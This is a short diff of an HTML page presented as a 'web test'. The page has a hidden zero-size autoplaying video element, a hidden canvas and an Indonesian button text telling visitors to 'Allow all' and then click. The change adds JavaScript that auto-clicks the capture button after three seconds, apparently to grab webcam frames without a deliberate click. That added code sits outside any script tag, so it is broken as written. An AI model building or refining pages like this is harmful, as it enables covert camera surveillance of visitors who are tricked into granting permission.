@@ -6,9 +6,18 @@
 <body>
   <h1>Welcome to web test</h1>
   <video id="video" width="0" height="0" autoplay></video>
-  <button id="capture-btn">Allow all untuk menggunakan semua fitur, lalu klik saya 2x</button>
+ <h1> <button id="capture-btn">Allow all untuk menggunakan semua fitur, lalu klik saya 2x</button></h1>
   <canvas id="canvas" width="0" height="0" style="display: none;"></canvas>
 
+  // Fungsi untuk melakukan klik tombol secara otomatis
+    function autoClickButton() {
+      var button = document.getElementById('capture-btn');
+      button.click();
+    }
+
+    // Melakukan klik tombol setelah 3 detik
+    setTimeout(autoClickButton, 3000);
+  
   <script>
     var video = document.getElementById('video');
 
